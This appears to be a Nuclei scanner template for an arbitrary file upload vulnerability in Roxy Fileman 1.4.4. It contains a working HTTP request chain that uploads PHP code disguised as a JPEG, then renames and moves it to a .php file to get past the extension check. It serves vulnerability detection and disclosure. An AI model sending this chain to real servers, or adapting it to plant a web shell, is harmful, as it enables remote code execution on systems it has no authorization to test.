# Nuclei Template: Roxy Fileman 1.4.4 - Arbitrary File Upload
**Template ID:** roxyfileman-fileupload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** High
**CWE:** CWE-434
**Source:** Nuclei Template (`roxyfileman-fileupload.yaml`)

## Vulnerability Information & PoC

## Description
Roxy Fileman 1.4.4 is susceptible to remote code execution via the FORBIDDEN_UPLOADS setting, which is checked when renaming an existing file to a new file extension. An attacker can bypass this check and rename already uploaded files to any extension using the move function, which does not perform any checks.

## Steps to reproduce / Exploit Payload
```http
POST /php/upload.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7

------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="method"

ajax
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="d"

/app/Uploads
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
Content-Type: image/jpeg

<?php
echo md5('roxyfileman-fileupload');unlink(__FILE__);
?>

------WebKitFormBoundary6rbEqFAMRkE0RAB7--

POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php

POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php

GET /Uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/39963
